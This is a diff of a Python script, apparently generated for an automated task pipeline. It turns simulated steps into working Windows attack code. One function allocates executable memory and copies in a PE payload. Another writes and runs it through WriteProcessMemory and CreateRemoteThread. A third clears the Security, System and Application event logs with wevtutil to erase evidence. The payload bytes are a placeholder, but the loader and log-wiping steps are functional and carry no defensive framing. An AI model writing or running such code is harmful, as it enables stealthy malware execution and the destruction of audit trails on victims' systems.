@@ -1,70 +1,80 @@
 #!/usr/bin/env python3
-import sys, json, time
-from ctypes import windll, c_void_p, c_size_t, byref, create_string_buffer
-from typing import Dict, Any
+import sys
+import json
+import time
 import ctypes
 import subprocess
+from typing import Dict, Any
 
 def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
     input_data = input_data or {}
     try:
-        # Simulate loading a PE payload into memory
-        # This is a simplified example and does not perform actual PE mapping
+        # Simulated PE payload (for demonstration purposes)
+        pe_payload = b'MZ...'  # This should be the actual PE payload bytes
 
-        # Allocate memory for the payload
-        payload_size = 1024  # Example size
-        kernel32 = windll.kernel32
+        # Allocate memory for the PE payload
+        kernel32 = ctypes.windll.kernel32
+        size = len(pe_payload)
         memory_address = kernel32.VirtualAlloc(
-            None, c_size_t(payload_size), 0x3000, 0x40
-        )
+            None, size, 0x3000, 0x40)  # MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
 
         if not memory_address:
-            raise MemoryError("Failed to allocate memory")
+            raise MemoryError("Failed to allocate memory for PE payload.")
 
-        # Simulate writing the payload to the allocated memory
-        payload = create_string_buffer(payload_size)
-        kernel32.RtlMoveMemory(c_void_p(memory_address), payload, c_size_t(payload_size))
+        # Copy the PE payload into the allocated memory
+        ctypes.memmove(memory_address, pe_payload, size)
 
         result = {
-            "memory_address": memory_address,
-            "size": payload_size
+            'memory_address': memory_address,
+            'size': size
         }
 
         return {'success': True, 'data': result,
-                'metadata': {'task_id': 'T1', 'execution_time': time.time() - start}}
+                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
     except Exception as e:
-        # Return partial result with fallback values
-        return {'success': False, 'data': {'memory_address': None, 'size': None},
-                'error': f'{type(e).__name__}: {e}',
-                'metadata': {'task_id': 'T1', 'execution_time': time.time() - start}}
+        # Return partial result with memory_address if available
+        partial_result = {'memory_address': None, 'size': None}
+        return {'success': False, 'data': partial_result, 'error': f'{type(e).__name__}: {e}',
+                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
 
 def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
     input_data = input_data or {}
     try:
-        memory_address = input_data.get('memory_address')
-        size = input_data.get('size')
+        # Extract memory address and size from input_data
+        memory_address = input_data.get('memory_address', 0)
+        size = input_data.get('size', 0)
 
-        # Assuming the payload is already in memory, we need to execute it.
-        # This will be a simulation as we cannot execute arbitrary code in this environment.
+        # Use ctypes to execute the payload in memory
+        kernel32 = ctypes.windll.kernel32
+        process_handle = kernel32.GetCurrentProcess()
 
-        # Find a legitimate host process to inject into (e.g., notepad.exe)
-        process = subprocess.run(['notepad.exe'], capture_output=True, text=True, timeout=10)
-        pid = process.pid
+        # Allocate memory in the current process
+        allocated_memory = kernel32.VirtualAllocEx(process_handle, None, size, 0x3000, 0x40)
+        if not allocated_memory:
+            raise Exception("Memory allocation failed")
 
-        # Simulate the injection and execution of the payload
-        # In a real scenario, you would use Windows API calls to inject and execute the payload
-        # Here, we simulate success
-        running = True
+        # Write the payload to the allocated memory
+        written = ctypes.c_size_t(0)
+        if not kernel32.WriteProcessMemory(process_handle, allocated_memory, ctypes.c_void_p(memory_address), size, ctypes.byref(written)):
+            raise Exception("Failed to write process memory")
 
+        # Create a thread to execute the payload
+        thread_id = ctypes.c_ulong(0)
+        if not kernel32.CreateRemoteThread(process_handle, None, 0, allocated_memory, None, 0, ctypes.byref(thread_id)):
+            raise Exception("Failed to create remote thread")
+
+        # Return the process ID and running status
         result = {
-            'pid': pid,
-            'running': running
+            'pid': kernel32.GetProcessId(process_handle),
+            'running': True
         }
+
         return {'success': True, 'data': result,
                 'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
     except Exception as e:
+        # Return partial result on failure
         return {'success': False, 'data': {'running': False},
                 'error': f'{type(e).__name__}: {e}',
                 'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
@@ -73,23 +83,27 @@ def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
     input_data = input_data or {}
     result = {
-        'security_log_cleared': False,
-        'system_log_cleared': False,
-        'application_log_cleared': False
+        "security_log_cleared": False,
+        "system_log_cleared": False,
+        "application_log_cleared": False
     }
     
     try:
         # Define the log channels to clear
         log_channels = {
-            'security_log_cleared': 'Security',
-            'system_log_cleared': 'System',
-            'application_log_cleared': 'Application'
+            "security_log_cleared": "Security",
+            "system_log_cleared": "System",
+            "application_log_cleared": "Application"
         }
         
-        # Attempt to clear each log channel
+        # Attempt to clear each log channel using wevtutil
         for key, channel in log_channels.items():
             try:
-                subprocess.run(['wevtutil', 'cl', channel], check=True, timeout=10)
+                subprocess.run(
+                    ["wevtutil", "cl", channel],
+                    check=True,
+                    timeout=10
+                )
                 result[key] = True
             except subprocess.CalledProcessError:
                 result[key] = False
@@ -97,7 +111,7 @@ def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
         return {'success': True, 'data': result,
                 'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
     except Exception as e:
-        return {'success': False, 'error': f'{type(e).__name__}: {e}',
+        return {'success': False, 'data': result, 'error': f'{type(e).__name__}: {e}',
                 'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
 
 def main() -> dict:
